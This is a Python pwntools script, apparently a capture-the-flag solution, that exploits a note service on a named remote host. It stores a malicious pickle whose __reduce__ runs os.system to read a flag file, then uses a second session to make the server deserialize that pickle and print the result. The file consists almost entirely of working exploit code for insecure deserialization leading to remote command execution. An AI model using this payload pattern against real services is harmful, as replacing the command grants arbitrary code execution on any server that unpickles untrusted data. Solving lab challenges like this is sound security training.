from pwn import *

class FlagGrabber:
    def __reduce__(self):
        cmd = ('cat /home/ctf/flag')
        return os.system, (cmd,)

pickled = pickle.dumps(FlagGrabber())

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22653

classy = remote(SERVER, PORT)
free = remote(SERVER, PORT)

classy.recvuntil(b'Username: ')
classy.send(b'diogo\n')

free.recvuntil(b'Username: ')
free.send(b'diogo\n')

classy.recvuntil(b'>>> ')
classy.send(b'0\n')
classy.recvuntil(b'>>> ')

free.recvuntil(b'>>> ')
free.send(b'1\n')
free.recvuntil(b'>>> ')
free.send(b'1\n')
free.recvuntil(b'note_name: ')
free.send(b'payload\n')
free.recvuntil(b'note_content: ')
free.sendline(pickled)
free.sendline()
sleep(1)

classy.send(b'0\n')
classy.recvuntil(b'note_name: ')
classy.send(b'payload\n')
print(classy.recvuntil(b'}').decode("UTF-8"))